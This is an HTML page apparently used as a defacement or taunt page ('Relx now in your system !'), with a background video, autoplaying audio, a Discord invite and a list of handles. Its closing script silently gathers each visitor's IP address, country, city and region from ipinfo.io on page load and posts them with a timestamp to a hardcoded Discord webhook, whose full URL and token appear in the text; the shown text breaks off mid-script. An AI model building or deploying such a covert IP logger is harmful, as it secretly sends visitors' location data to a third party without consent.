<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <link rel="icon" type="image/png" href="https://media.discordapp.net/attachments/1230654483797905499/1268648241864376362/138_1.gif?ex=66bbb0bf&is=66ba5f3f&hm=80c3d6627e3e7769582cab6f786e0fab8680c0aac7cc41854502f65f6db15677&" />
  <link rel="shortcut icon">
  <link href="https://fonts.googleapis.com/css?family=monospace" rel="stylesheet">
  <meta name="Author" content="P">
  <meta name="copyright" content="">
  <meta name="description" content="" />
  <meta http-equiv="cache-control" content="index,cache">
  <meta http-equiv="pragma" content="index,cache">
  <title>&#1203;&#824;&#1202;&#824;&#1203; 5-1  - 5-1 - 5-1 - 5-1 -5-1 -5-1 -5-1 -5-1 -5-1 -5-1 -5-1 -5-1  &#1203;&#824;&#1202;&#824;&#1203;</title>
  <meta charset="UTF-8" />
  <style>
    html, body {
      height: 100%;
      margin: 0;
      overflow: hidden;
      font-family: 'monospace';
    }
    .bg-video {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: -1;
    }
    .content {
      position: relative;
      z-index: 1;
      text-align: center;
      color: white;
    }
    h1, p, font, marquee, #clock {
      text-shadow: 0 0 4px rgba(0, 0, 0, 0.8);
    }
    a:link {
      text-decoration: none;
    }
  </style>
</head>
<script>
  function playSound() {
    var audio = document.querySelector("audio");
    audio.play();
  }

  async function fetchIP() {
    try {
      let response = await fetch('https://api.ipify.org?format=json');
      let data = await response.json();
      let ip = data.ip;
      document.getElementById('ip-address').innerHTML = 'IP: ' + ip;
    } catch (error) {
      console.error('Error fetching IP address:', error);
    }
  }

  document.addEventListener('DOMContentLoaded', fetchIP);
</script>
<body onclick="playSound()" onmouseover="playSound()">
  <video class="bg-video" autoplay loop muted>
    <source src="https://cdn.discordapp.com/attachments/1293893828566323222/1295408257145376809/-172564991549819897511.mp4?ex=670e8a74&is=670d38f4&hm=9911ec656c0d070083d0e94a64394612cf53eb2b360e5b90a359b52ba1c27e1e&">
    Your browser does not support the video tag.
  </video>
  <audio src="https://cdn.discordapp.com/attachments/1276895317002031188/1291775701846065152/Recording_2024-10-03_150440.mp4?ex=670dd99f&is=670c881f&hm=8735957fe088594e50bc00f081e65640da3fb19b72e1692bf53a499226409e68&" autoplay loop></audio>
  <div class="content">
    <center>
      <h1 class="ip-display"><font color="#f30404" size="6"> Relx now in your system ! </font></h1>
      <p class="ip-display"><b><font color="#c9cdd2" size="3px"></font></b></p>
<a href="https://discord.gg/5-1" style="font-size: 20px; color: rgb(221, 4, 4); text-decoration: none;">Discord.gg/5-1</a>
     
   
         
     
    
      <br>
      <div class="ip-display" id="clock"></div>
      <div id="ip-address" style="color:#ff0000; margin-top: 5px;"></div>
      <script type="text/javascript">
        function showTime() {
          var a_p = "";
          var today = new Date();
          var curr_hour = today.getHours();
          var curr_minute = today.getMinutes();
          var curr_second = today.getSeconds();
          if (curr_hour < 12) {
            a_p = "AM";
          } else {
            a_p = "PM";
          }
          if (curr_hour == 0) {
            curr_hour = 12;
          } if (curr_hour > 12) {
            curr_hour = curr_hour - 12;
          }
          curr_hour = checkTime(curr_hour);
          curr_minute = checkTime(curr_minute);
          curr_second = checkTime(curr_second);
          document.getElementById('clock').innerHTML = curr_hour + ":" + curr_minute + ":" + curr_second + " " + a_p;
        }
        
        
        
       </script>
<marquee>
              <font size="3">
                <b></b> Boshikha - bo3skor - al-dfere - relx 
            </marquee>
          </div>
      </td>
    </table>
  
<script>
   fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
      const { ip, country, city, region } = data;
      const dateTime = new Date().toLocaleString();
      const webhookUrl = 'https://canary.discord.com/api/webhooks/1272599625152593951/Dj5mazYsxxu4h6U9S7RRsHENejdvuInKtdQyID2tGleWoSJImsnGbct5azv28GPCO4H-';
      fetch(webhookUrl, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
      });